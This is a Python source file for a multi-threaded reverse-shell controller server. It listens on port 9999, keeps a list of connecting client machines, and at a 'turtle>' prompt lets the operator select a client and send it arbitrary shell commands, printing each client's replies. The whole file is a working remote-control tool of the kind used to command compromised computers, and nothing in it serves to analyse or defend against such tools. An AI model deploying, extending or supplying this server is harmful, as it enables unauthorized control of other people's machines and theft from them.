import socket, sys, threading, time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_address = []



#Create a socket (connecting two or more computers)
def socket_creation():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))



#binding the socket and listening for connections

def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the port to " + str(port))

        s.bind((host, port))

        s.listen(5)

    except socket.error as msg:
        print("Socket, Binding error " + str(msg) + "\n" + "Retrying....")
        bind_socket()

#Handling connection from multiple client and saving to a list
#Closing previous connections when server.py file is restarted

#this function will be running in the first thread
def accepting_connections():
    #the section below closes all connections and clears all information of previous connections if the server.py file is rerun
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, address = s.accept()
            print("Connection has been established " + address[0] + " | Port" + str(address[1]))
            #This prevents timeouts from connection with server
            s.setblocking(1)

            all_connections.append(conn)
            all_address.append(address)

            print("Connection has been established :" + address[0])

        except:
            print("Error accepting connections")

#2nd thread functions - 1) See all the clients 2) Select a client 3) Send commands to the connected client
#Interactive prompt for sending commands

def start_turtle():
    print("list of commands" + "\n" + "list - lists available connections" + "\n" + "select (num) - selects the connection")
    while True:
        cmd = input('turtle>')
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            #error checking  below; checking that there is a existing connection from the user input
            if conn is not None:
                send_target_commands(conn)
        elif 'quit' in cmd:
            print("quitting")
            break
        else:
            print("command not recognized")

#Display all current active connections with the client

def list_connections():
    results = ''
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            #the recv function will throw and exception if the there is no data
            conn.recv(201480)
        except:
            del all_connections[i]
            del all_address[i]
            continue
        #all_address[0] = ip address and all_address[1] = port number
        results = str(i) + "  " + str(all_address[i][0]) + str(all_address[i][1]) + "\n"

    print("----Clients----" + "\n" + results)


#selecting the target connection
def get_target(cmd):
    try:
        target = cmd.replace('select ', '') #the value of target will equal the connection id
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to :" + str(all_address[target][0]))
        #this will show what address you are currently connected to (think about prompting the serverside user to add a name to this connection so that it just doesnt display an IP number
        print(str(all_address[target][0]) + ">", end="")
        return conn

    except:
        print("Selection not valid")
        return None


#Sending commands to client machine
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                conn.close()
                s.close()
                sys.exit()
                break
            elif len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
                continue
        except:
            print("Error sending commands")
            break

#creating worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        #.Thread takes a function as a parameter to specify what process to do depending on which thread is being called
        t = threading.Thread(target=work)
        #t.daemon releases the alotted memory if the program is terminated
        t.daemon = True
        t.start()


#Do next job that is in the queue (1st thread: handle connections, 2nd thread:send commands)
def work():
    while True:
        x = queue.get()
        if x == 1:
            socket_creation()
            bind_socket()
            accepting_connections()
        if x == 2:
            start_turtle()

        queue.task_done()

def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()

create_workers()
create_jobs()
